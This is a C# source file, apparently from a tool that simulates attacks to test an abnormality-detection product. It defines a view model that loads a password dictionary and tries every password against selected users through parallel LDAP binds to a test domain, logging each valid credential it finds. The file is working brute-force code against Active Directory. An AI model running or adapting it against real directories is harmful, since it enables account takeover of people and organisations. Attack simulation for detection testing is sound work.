using System;
using System.Collections.ObjectModel;
using System.DirectoryServices.Protocols;
using System.IO;
using System.Net;
using System.Threading.Tasks;
using Microsoft.Win32;

namespace Abnormal_UI.UI.BruteForce
{
    public class BruteForceViewModel: AttackViewModel
    {
        public ObservableCollection<string> PasswordList { get; set; }
        public BruteForceViewModel()
        {
            PasswordList = new ObservableCollection<string>();
        }
        public bool BruteForce(AuthType authType)
        {
            try
            {
                Parallel.ForEach(SelectedUsers, (user) =>
                {
                    Parallel.ForEach(PasswordList, (pass) =>
                    {
                        if (ValidateCredentials(user.SamName, pass, authType))
                        {
                            Logger.Debug($"Found valid credentials for: {user.SamName}");
                        }
                    });
                });
                return true;
            }
            catch (Exception ex)
            {
                Logger.Error(ex);
                return false;
            }
        }

        private static bool ValidateCredentials(string username, string password, AuthType authType)
        {
            var credentials
                = new NetworkCredential(username, password, "domain1");
            var id = new LdapDirectoryIdentifier("domain1.test.local");
            using (var connection = new LdapConnection(id, credentials, authType))
            {
                connection.SessionOptions.Sealing = true;
                connection.SessionOptions.Signing = true;
                try
                {
                    connection.Bind();
                }
                catch (LdapException)
                {
                    return false;
                }
                return true;
            }
        }
        public bool LoadDictionary()
        {
            try
            {
                var browseWindow = new OpenFileDialog();
                browseWindow.ShowDialog();
                var filePath = browseWindow.FileName;
                PasswordList.Clear();
                PasswordList = new ObservableCollection<string>(File.ReadAllText(filePath).Split(new[] { "\r\n" }, StringSplitOptions.None));
                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }
    }
}
